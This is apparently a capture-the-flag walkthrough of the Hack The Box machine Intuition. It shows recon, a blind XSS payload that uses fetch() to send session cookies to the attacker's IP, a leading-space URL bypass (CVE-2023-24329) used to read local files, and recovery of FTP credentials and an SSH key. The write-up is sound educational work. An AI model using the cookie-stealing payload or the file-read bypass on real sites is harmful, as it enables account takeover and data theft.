---
title: HTB: Intuition
url: https://0xdf.gitlab.io/2024/09/14/htb-intuition.html
date: 2024-09-14T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: htb-intuition, hackthebox, ctf, nmap, ffuf, subdomain, flask-unsign, flask, python, feroxbuster, xss, xss-cookie, file-read, exiftool, cve-2023-24329, docker, selenium-grid, suricata, hashcat, command-injection, ansible, ansible-galaxy, vnc, docker-escape, docker-escape-raw-disk, htb-onlyforyou
---

![Intuition](/img/intuition-cover.png)

Intuition starts off with a set of websites around a page that handles compressing of documents. There’s an auth site, a site for reporting bugs, and an admin dashboard. I’ll abuse a cross-site scripting attack in the bug report to get access first as a web developer, and then again to get access as an admin. In the admin dashboard, I’ll find a file read vulnerability by exploiting a bug in Python’s urllib to export files as PDFs. I’ll use that to access the FTP server with creds I find to get a private SSH key. I’ll find the next user’s password logged in Suricata logs due to a bad configuration. For root, I’ll abuse some custom binaries designed to interact with Ansible, both through a command injection and by abusing a bug in Ansible Galaxy. In Beyond Root, I’ll show the unintended root step that originally got first blood on the box abusing VNC access in Selenium Grid and then a neat Docker escape using a low priv shell on the host.

## Box Info

| Name | [Intuition](https://hackthebox.com/machines/intuition)  [Intuition](https://hackthebox.com/machines/intuition) [Play on HackTheBox](https://hackthebox.com/machines/intuition) |
| --- | --- |
| Release Date | [27 Apr 2024](https://twitter.com/hackthebox_eu/status/1783526402756677792) |
| Retire Date | 14 Sep 2024 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Intuition |
| Radar Graph | Radar chart for Intuition |
| First Blood User | 01:56:17[celesian celesian](https://app.hackthebox.com/users/114435) |
| First Blood Root | 04:29:54[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creator | [kavigihan kavigihan](https://app.hackthebox.com/users/389926) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.15
Starting Nmap 7.80 ( https://nmap.org ) at 2024-05-03 10:50 EDT
Nmap scan report for 10.10.11.15
Host is up (0.098s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.00 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.15
Starting Nmap 7.80 ( https://nmap.org ) at 2024-05-03 10:52 EDT
Nmap scan report for 10.10.11.15
Host is up (0.097s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://comprezzor.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.31 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu jammy 22.04.

The HTTP server is redirecting to `comprezzor.htb`.

### Subdomain Fuzz

I’ll use `ffuf` to fuzz for subdomains that respond differently than others on the webserver. It finds a three:

```

oxdf@hacky$ ffuf -u http://10.10.11.15 -H "Host: FUZZ.comprezzor.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.15
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.comprezzor.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

auth                    [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 106ms]
report                  [Status: 200, Size: 3166, Words: 1102, Lines: 109, Duration: 109ms]
dashboard               [Status: 302, Size: 251, Words: 18, Lines: 6, Duration: 103ms]
:: Progress: [19966/19966] :: Job [1/1] :: 404 req/sec :: Duration: [0:00:50] :: Errors: 0 ::

```

I’ll add all of these to my `/etc/hosts` file:

```
10.10.11.15 comprezzor.htb auth.comprezzor.htb report.comprezzor.htb dashboard.comprezzor.htb

```

### comprezzor.htb - TCP 80

#### Site

The site is a compression service:

![image-20240503123143418](/img/image-20240503123143418.png)

There is an email, `support@comprezzor.htb`, as well as a link to one of the subdomains I already identified, `report.comprezzor.htb`.

If I give the site a dummpy PDF, it returns the same file with `.xz` appended:

![image-20240503123257697](/img/image-20240503123257697.png)

I can uncompress is using `unxz` (comes on many distros, but `apt install xz-utils` if not), and it returns the same file as originally submitted.

#### Tech Stack

The HTTP headers give no useful information getting the main site.

Submitting the file is a POST request to `/` with the file as form data:

```

POST / HTTP/1.1
Host: comprezzor.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------32479346107364829544104025471
Content-Length: 233
Origin: http://comprezzor.htb
Connection: close
Referer: http://comprezzor.htb/
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
-----------------------------32479346107364829544104025471
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

this is a test
-----------------------------32479346107364829544104025471--

```

The POST response is a raw `xz` file:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 03 May 2024 16:35:52 GMT
Content-Type: application/x-xz
Content-Length: 72
Connection: close
Content-Disposition: attachment; filename=test.txt.xz
Last-Modified: Fri, 03 May 2024 16:35:52 GMT
Cache-Control: no-cache
ETag: "1714754152.3882406-72-2571702717"
Vary: Cookie
Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIkZpbGUgc3VjY2Vzc2Z1bGx5IGNvbXByZXNzZWQhIl19XX0.ZjUSaA.PccYhzFq9agcarIUkTLFvrf3Zcc; Domain=.comprezzor.htb; HttpOnly; Path=/

ý7zXZ

```

It does set a `session` cookie. It kind of looks like a JWT, but putting it into something like [jwt.io](https://jwt.io/) shows it’s not valid:

![image-20240503133552206](/img/image-20240503133552206.png)

It’s actually a Flask cookie, which share the three base64-encoded sections joined by periods, but uses a different format:

```

oxdf@hacky$ flask-unsign --decode -c eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIkZpbGUgc3VjY2Vzc2Z1bGx5IGNvbXByZXNzZWQhIl19XX0.ZjUSaA.PccYhzFq9agcarIUkTLFvrf3Zcc
{'_flashes': [('success', 'File successfully compressed!')]}

```

The site is using a cookie to pass status messages. Use of Flask cookies suggests this site is written in Python’s Flask framework.

It is worth noting that the domain of this cookie is `.comprezzor.htb`, which means it applies to all subdomains of `comprezzor.htb`.

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@hacky$ feroxbuster -u http://comprezzor.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://comprezzor.htb
 🚀  Threads               │ 50               
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt       
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴────────────────────── 
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       79l      357w     3408c http://comprezzor.htb/      
[####################] - 6m     30000/30000   0s      found:1       errors:0      
[####################] - 6m     30000/30000   76/s    http://comprezzor.htb/ 

```

It doesn’t find anything.

### auth.comprezzor.htb - TCP 80

#### Site

This site presents a login form:

![image-20240503125155213](/img/image-20240503125155213.png)

I am able to register a user and log in, and on logging in, it redirects to `report.comprezzor.htb` with a flash message:

![image-20240503125741204](/img/image-20240503125741204.png)

#### Tech Stack

On visiting `/`, it returns a 302 redirect to `/login`. This page doesn’t load as `/login.php` or `/login/index.php`, returning the default nginx 404 page.

Logging in sets a cookie:

```

HTTP/1.1 302 FOUND
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 03 May 2024 16:55:28 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 245
Connection: close
Location: http://report.comprezzor.htb/
Set-Cookie: user_data=eyJ1c2VyX2lkIjogNiwgInVzZXJuYW1lIjogIjB4ZGYiLCAicm9sZSI6ICJ1c2VyIn18ZWU5YzU5ZTU5ZjEzNDE3N2QyOWY3MTZiNGJlMzBiYjVjMzA2YmIwOWJlYmEwODM0YjdiOTEwNDkwOTBhMDdkNw==; Domain=.comprezzor.htb; Path=/
Vary: Cookie
Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIkxvZ2dlZCBpbiBzdWNjZXNzZnVsbHkhIl19XX0.ZjUXAA.UT3mmdFp_8SOxaRMCgg4SnszNn8; Domain=.comprezzor.htb; HttpOnly; Path=/

```

There are two cookies this time. `session` appears the same as above, used for flash messages:

```

oxdf@hacky$ flask-unsign --decode -c eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIkxvZ2dlZCBpbiBzdWNjZXNzZnVsbHkhIl19XX0.ZjUXAA.UT3mmdFp_8SOxaRMCgg4SnszNn8
{'_flashes': [('success', 'Logged in successfully!')]}

```

`user_data` is a single base64-encoded blob:

```

oxdf@hacky$ echo eyJ1c2VyX2lkIjogNiwgInVzZXJuYW1lIjogIjB4ZGYiLCAicm9sZSI6ICJ1c2VyIn18ZWU5YzU5ZTU5ZjEzNDE3N2QyOWY3MTZiNGJlMzBiYjVjMzA2YmIwOWJlYmEwODM0YjdiOTEwNDkwOTBhMDdkNw== | base64 -d
{"user_id": 6, "username": "0xdf", "role": "user"}|ee9c59e59f134177d29f716b4be30bb5c306bb09beba0834b7b91049090a07d7

```

It looks like two parts, joined by `|`. The first is JSON data about my user. I suspect the second is a signature or keyed hash to verify the data isn’t tampered with. If I try editing my role or user id and re-base64-encoding, it is not accepted by the site.

It’s not clear why the site is using it’s own auth (when Flask has methods to do this built in).

#### Directory Brute Force

Running `feroxbuster` here finds `/logout`, but otherwise nothing interesting:

```

oxdf@hacky$ feroxbuster -u http://auth.comprezzor.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://auth.comprezzor.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      108l      229w     2876c http://auth.comprezzor.htb/login
302      GET        5l       22w      199c http://auth.comprezzor.htb/ => http://auth.comprezzor.htb/login
200      GET       91l      222w     2769c http://auth.comprezzor.htb/register
500      GET        5l       37w      265c http://auth.comprezzor.htb/logout
[####################] - 3m     30000/30000   0s      found:4       errors:0      
[####################] - 3m     30000/30000   154/s   http://auth.comprezzor.htb/ 

```

Visiting `/logout` crashes:

![image-20240503125933435](/img/image-20240503125933435.png)

### report.comprezzor.htb - TCP 80

#### Site

This page is for bug report submission:

![image-20240503130043048](/img/image-20240503130043048.png)

The “here” link goes to `/about_reports`:

![image-20240503130117791](/img/image-20240503130117791.png)

The important part to understand from this page is the process that tickets move. They start with the developers, and can be escalated to the administrators.

Clicking the “Report a Bug” button redirects to `auth.comprezzor.htb` if I’m not logged in. Once I log in, it goes to a simple form:

![image-20240503130235617](/img/image-20240503130235617.png)

I’ll submit a report, and it shows another flash message over the form:

![image-20240503134847642](/img/image-20240503134847642.png)

#### Tech Stack

This site has the same look and feel as the others, and shares the same cookie. The response headers are still very short:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 03 May 2024 17:02:26 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 3041

```

Not much else to go on here.

### dashboard.comprezzor.htb - TCP 80

Trying to visit this site either without being logged in or logged in as a newly registered user returns a redirect to `auth.comprezzor.htb/login` with the message:

![image-20240503132822974](/img/image-20240503132822974.png)

## Shell as dev\_acc

### Access Dashboard as Wevdev

#### XSS Cookie Grab

Without a lot to go on, I’ll go to the report submission form and try some cross-site scripting (XSS) payloads. I’ve already seen that whatever I submit won’t be displayed back to me, so this would be a blind XSS.

I’ll use a very simple `<img>` tag payload like this:

```

<img src="http://10.10.14.6/description.png" onerror="fetch('http://10.10.14.6/description?cookie='+document.cookie)">

```

It tries to add an image to the page where the source is my host, and will fail. Then it has an `onerror` that gives JavaScript that will try to exfil the current user’s cookie to my server. This could generate up to two requests back to me. The first would show HTML injection, where the image tag is processed and tries to load. When my server 404s `description.png`, then it will try the JavaScript to send the cookie.

I’ll put this in the description field, and another copy in the title, changing “description” to “title” to see which one is firing.

Very quickly I get four connections at my Python webserver:

```
10.10.11.15 - - [03/May/2024 13:55:16] code 404, message File not found
10.10.11.15 - - [03/May/2024 13:55:16] "GET /title.png HTTP/1.1" 404 -
10.10.11.15 - - [03/May/2024 13:55:16] code 404, message File not found
10.10.11.15 - - [03/May/2024 13:55:16] "GET /description.png HTTP/1.1" 404 -
10.10.11.15 - - [03/May/2024 13:55:17] code 404, message File not found
10.10.11.15 - - [03/May/2024 13:55:17] "GET /title?cookie=user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1" 404 -
10.10.11.15 - - [03/May/2024 13:55:17] code 404, message File not found
10.10.11.15 - - [03/May/2024 13:55:17] "GET /description?cookie=user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1" 404 -

```

Both fired, returning the same cookie twice!

This cookie is for the adam user, and does have a different role than the account I was able to register:

```

oxdf@hacky$ echo "eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4" | base64 -d
{"user_id": 2, "username": "adam", "role": "webdev"}|58f6f725339ce3f69d8552a10696ddebb68b2b57d2e523c08bde868d3a756db8

```

#### View Dashboard

I’ll take this cookie and go into the Firefox dev tools under Storage and find cookies for this site. I’ll replace what’s there with adam’s cookie:

![image-20240503135959763](/img/image-20240503135959763.png)

Now I’ll revisit `dashboard.comprezzor.htb`:

![image-20240503140019369](/img/image-20240503140019369.png)

### Access Dashboard as Admin

#### Enumerate

There are five tickets on the dash board. Viewing one shows three buttons:

![image-20240503141520386](/img/image-20240503141520386.png)

Clicking “Set High Priority” changes the value to 1:

![image-20240503141554738](/img/image-20240503141554738.png)

Now the button says “Set Low Priority”:

![image-20240503141614167](/img/image-20240503141614167.png)

Ticket seem to be deleted once they are processed relatively quickly, but if I rush, I can make a ticket and see it show up in there.

![image-20240503142545531](/img/image-20240503142545531.png)

#### Admin XSS

I’ll submit another ticket with my XSS payload and quickly go into the dashboard and make it high priority:

![image-20240503142955777](/img/image-20240503142955777.png)

After less than a minute, it’s gone, but there’s a new cookie at my webserver:

```
10.10.11.15 - - [03/May/2024 14:30:09] code 404, message File not found
10.10.11.15 - - [03/May/2024 14:30:09] "GET /description?cookie=user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5 HTTP/1.1" 404 -

```

It’s from the admin user:

```

oxdf@hacky$ echo eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5 | base64 -d
{"user_id": 1, "username": "admin", "role": "admin"}|34822333d444ae0e4022f6cc679ac9d26d1d1d682c59c61cfbea29d776d589d9

```

### Host File Read

#### Enumeration

As admin role, the `dashboard` gets more links:

![image-20240503143755714](/img/image-20240503143755714.png)

The main page just shows the high priority reports. “Full report list” shows all the open tickets.

Clicking “Create a backup” sends a GET to `/backup`, and then there’s a flash message:

![image-20240503143936970](/img/image-20240503143936970.png)

It’s not clear what this is doing, but there doesn’t seem like much I can interact with it now.

“Create PDF report” leads to `/create_pdf_report` which asks for a URL for some reason:

![image-20240503145124870](/img/image-20240503145124870.png)

If I give it my IP, it requests my page:

```
10.10.11.15 - - [03/May/2024 14:52:39] "GET / HTTP/1.1" 200 

```

And then prints the result as a PDF:

![image-20240503145307038](/img/image-20240503145307038.png)

If I try to give one of the `comprezzor.htb` domains, it complains responds “Invalid URL”. Same with URLs like `file:///etc/passwd` that would read files from the filesystem.

The downloaded PDF is made with `wkhtmltopdf 0.12.6`:

```

oxdf@hacky$ exiftool report_28760.pdf
ExifTool Version Number         : 12.40
File Name                       : report_28760.pdf
Directory                       : .
File Size                       : 7.8 KiB
File Modification Date/Time     : 2024:05:03 14:52:39-04:00
File Access Date/Time           : 2024:05:03 14:54:43-04:00
File Inode Change Date/Time     : 2024:05:03 14:54:42-04:00
File Permissions                : -rwxrwx---
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Title                           : 
Creator                         : wkhtmltopdf 0.12.6
Producer                        : Qt 5.15.2
Create Date                     : 2024:05:03 18:52:29Z
Page Count                      : 1

```

To see how the server is working, I’ll also try catching a request with `nc`:

```

oxdf@hacky$ nc -lvnp 80
Listening on 0.0.0.0 80
Connection received on 10.10.11.15 38552
GET / HTTP/1.1
Accept-Encoding: identity
Host: 10.10.14.6
User-Agent: Python-urllib/3.11
Cookie: user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5
Connection: close

```

It is a Python webserver as expected.

#### CVE-2022-35583 - Rabbit Hole

Searching for “wkhtmltopdf 0.12.6 exploit” finds a bunch of references from spring 2023:

![image-20240503145827095](/img/image-20240503145827095.png)

[This vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2022-35583) is a SSRF where I can inject an iFrame tag into the PDF content and access internal assets. At this point, I can’t think of any internal pages that I know of and want to gain access to. There are some more exploratory steps I could take, but they seem like long shots, so I’ll come back to this if necessary.

#### CVE-2023-24329

Searching for “Python-urllib/3.11 exploit” returns a different CVE:

![image-20240503150908656](/img/image-20240503150908656.png)

This is a very simple bug where `urllib.urlparse` doesn’t handle well when the URL starts with a space. From [Nist](https://nvd.nist.gov/vuln/detail/CVE-2023-24329):

> An issue in the urllib.parse component of Python before 3.11.4 allows attackers to bypass blocklisting methods by supplying a URL that starts with blank characters.

To demonstrate, I’ll get a Python Docker container from a vulnerable version:

```

oxdf@hacky$ docker run -it python:3.11.3 bash
Unable to find image 'python:3.11.3' locally
3.11.3: Pulling from library/python
bd73737482dd: Pull complete 
6710592d62aa: Pull complete 
75256935197e: Pull complete 
c1e5026c6457: Pull complete 
f0016544b8b9: Pull complete 
1d58eee51ff2: Pull complete 
93dc7b704cd1: Pull complete 
caefdefa531e: Pull complete 
Digest: sha256:3a619e3c96fd4c5fc5e1998fd4dcb1f1403eb90c4c6409c70d7e80b9468df7df
Status: Downloaded newer image for python:3.11.3
root@ecb437f2100d:/# 

```

I’ll get a Python shell and import `urlprase`:

```

root@ecb437f2100d:/# python
Python 3.11.3 (main, May 23 2023, 13:25:46) [GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from urllib.parse import urlparse

```

Normally, programs would use `urlparse` to get the different parts of a URL. For example:

```

>>> urlparse("https://0xdf.gitlab.io")
ParseResult(scheme='https', netloc='0xdf.gitlab.io', path='', params='', query='', fragment='')

```

Here it could check the scheme is an allowed scheme, or that the `netloc` isn’t on a denylist. For this box, it seems like the `file` scheme is blocked.

If I put a space in front of the URL, it returns completely different and useless results:

```

>>> urlparse(" https://0xdf.gitlab.io")
ParseResult(scheme='', netloc='', path=' https://0xdf.gitlab.io', params='', query='', fragment='')

```

The same thing works for the `file` scheme:

```

>>> urlparse("file:///etc/passwd")
ParseResult(scheme='file', netloc='', path='/etc/passwd', params='', query='', fragment='')
>>> urlparse(" file:///etc/passwd")
ParseResult(scheme='', netloc='', path=' file:///etc/passwd', params='', query='', fragment='')

```

#### File Read

Putting this all together, I’ll submit “ file:///etc/passwd” (with a leading space) to the site:

![image-20240503153032233](/img/image-20240503153032233.png)

That’s file read.

### File Enumeration

#### Strategy

Reading files here is very annoying. I can’t send the request to repeater because the response is compressed into a PDF that it won’t show. I have to put each file into the site, and read the resulting PDF which doesn’t handle line breaks nicely. I’m going to resist going down rabbit holes as much as possible here.

#### Environment

Fetching `/proc/self/environ`, it seems that the website is running as root and running out of `/app`:

![image-20240503153607941](/img/image-20240503153607941.png)

That feels like a Docker container, but hard to say. `/proc/self/cmdline` shows it’s `python3 /app/code/app.py`:

![image-20240503153655198](/img/image-20240503153655198.png)

#### Flask Source Overview

I’ll grab `/proc/self/cwd/code/app.py`:

![image-20240503153942334](/img/image-20240503153942334.png)

It’s a flask application, and it’s registering routes through [Blueprints](https://flask.palletsprojects.com/en/3.0.x/blueprints/), which allow for putting routes in different files and loading them like this.

The important imports are:
- `from blueprints.index.index import main_bp` - Probably in `blueprints/index/index.py`
- `from blueprints.report.report import report_bp` - Probably in `blueprints/report/report.py`
- `from blueprints.auth.auth import auth_bp` - Probably in `blueprints/auth/auth.py`
- `from blueprints.dashboard.dashboard import dashboard_bp` - Probably in `blueprints/dashboard/dashboard.py`.

#### Strategy

At this point, I could go for `auth` and try to figure out this custom token. But I’m already an admin on the website, and I’m not sure what else there is left.

I could also check out the main service to see how it’s compressing files and if there’s any kind of command injection there.

The big thing standing out is the “backup” functionality in the dashboard, which does something, but it’s unclear what.

#### Dashboard

I’ll submit “ file:///proc/self/cwd/code/blueprints/dashboard/dashboard.py”:

![image-20240503155650103](/img/image-20240503155650103.png)

It’s a mess. I’ll take a few minutes and re-add whitespace to get code. At the end, there’s the function that handles `/backup`:

```

@dashboard_bp.route('/backup', methods=['GET']) 
@admin_required 
def backup(): 
    source_directory = os.path.abspath(os.path.dirname(__file__) + '../../../') 
    current_datetime = datetime.now().strftime("%Y%m%d%H%M%S")
    backup_filename = f'app_backup_{current_datetime}.zip'
    with zipfile.ZipFile(backup_filename, 'w', zipfile.ZIP_DEFLATED) as zipf: 
        for root, _, files in os.walk(source_directory): 
            for file in files: 
                file_path = os.path.join(root, file) 
                arcname = os.path.relpath(file_path, source_directory)
                zipf.write(file_path, arcname=arcname) 
                try: 
                    ftp = FTP('ftp.local') 
                    ftp.login(user='ftp_admin', passwd='u3jai8y71s2') 
                    ftp.cwd('/') 
                    with open(backup_filename, 'rb') as file: 
                        ftp.storbinary(f'STOR {backup_filename}', file) 
                    ftp.quit()
                    os.remove(backup_filename) 
                    flash('Backup and upload completed successfully!', 'success') 
                except Exception as e: 
                    flash(f'Error: {str(e)}', 'error') 
    return redirect(url_for('dashboard.dashboard'))

```

It’s zipping a file and sending it over FTP to `ftp.local` with creds!

### Access FTP Share

FTP isn’t open from what I can see. I’ll try the SSRF in the report generator, submitting “ ftp://ftp\_admin:u3jai8y71s2@ftp.local/” to see what comes back:

![image-20240503160110024](/img/image-20240503160110024.png)

There’s three files:
- `private-8297.key`
- `welcome_note.pdf`
- `welcome_note.txt`

The `.key` file is an SSH key:

![image-20240503160217153](/img/image-20240503160217153.png)

`welcome_note.txt` is important as well, as it has the password for the key:

![image-20240503160313379](/img/image-20240503160313379.png)

Trying to load the PDF just fails.

### SSH

#### Username

I’ll save the key to a file, but in order to connect I’ll need the username. Because the key is encrypted, I can’t directly read the comment:

```

oxdf@hacky$ ssh-keygen -l -f private-8297.key 
3072 SHA256:NOedbgY+n/BF6DXYBjKDONiP1NawZo71VpAGdiSEf4o no comment (RSA)

```

To change the password of the key, I’ll use `ssh-keygen -p -f`:

```

oxdf@hacky$ ssh-keygen -p -f private-8297.key 
Enter old passphrase: 
Key has comment 'dev_acc@local'
Enter new passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved with the new passphrase.

```

Not only does this make a copy of the key with no password, but it also show the comment (which typically is the username of the user who created the key). I can read the comment later as well with `ssh-keygen`:

```

oxdf@hacky$ ssh-keygen -l -f private-8297.key 
3072 SHA256:NOedbgY+n/BF6DXYBjKDONiP1NawZo71VpAGdiSEf4o dev_acc@local (RSA)

```

#### Connect

Now I can connect as dev\_acc:

```

oxdf@hacky$ ssh -i ~/keys/intuition-dev_acc dev_acc@comprezzor.htb
...[snip]...
dev_acc@intuition:~$

```

And read `user.txt`:

```

dev_acc@intuition:~$ cat user.txt
62393144************************

```

## Shell as lopez

### Enumeration

#### Users

dev\_acc’s home directory is basically empty:

```

dev_acc@intuition:~$ ls -la
total 28
drwxr-x--- 4 dev_acc dev_acc 4096 May  3 19:14 .
drwxr-xr-x 5 root    root    4096 Apr 25 11:49 ..
lrwxrwxrwx 1 root    root       9 Apr  9 18:26 .bash_history -> /dev/null
-rw-r--r-- 1 dev_acc dev_acc 3771 Sep 17  2023 .bashrc
drwx------ 2 dev_acc dev_acc 4096 Apr  4 16:21 .cache
-rw-r--r-- 1 dev_acc dev_acc  807 Sep 17  2023 .profile
-rw------- 1 dev_acc dev_acc    0 May  3 19:14 .python_history
drwx------ 2 dev_acc dev_acc 4096 Oct  8  2023 .ssh
-rw-r----- 1 root    dev_acc   33 May  3 14:48 user.txt

```

There are two other users on the box:

```

dev_acc@intuition:/home$ ls
adam  dev_acc  lopez

```

That matches users with shells in `/etc/passwd`:

```

dev_acc@intuition:~$ grep "sh$" /etc/passwd
root:x:0:0:root:/root:/bin/bash
adam:x:1002:1002:,,,:/home/adam:/bin/bash
dev_acc:x:1001:1001:,,,:/home/dev_acc:/bin/bash
lopez:x:1003:1003:,,,:/home/lopez:/bin/bash

```

#### opt

There’s a bunch of stuff in `/opt`:

```

dev_acc@intuition:/opt$ ls
containerd  ftp  google  playbooks  runner2

```

`containerd` is likely where the Docker images are. `google` is an install of Chrome likely for the XSS.

`ftp` shows two folders:

```

dev_acc@intuition:/opt$ ls ftp/
adam  ftp_admin

```

dev\_acc can’t access either, but when I find creds for adam I should check this.

dev\_acc can’t access `playbooks` or `runner2`.

#### Network

The netstat shows ports that were not accessible directly:

```

dev_acc@intuition:~$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 172.21.0.1:21           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:4444          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:38737         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 

```

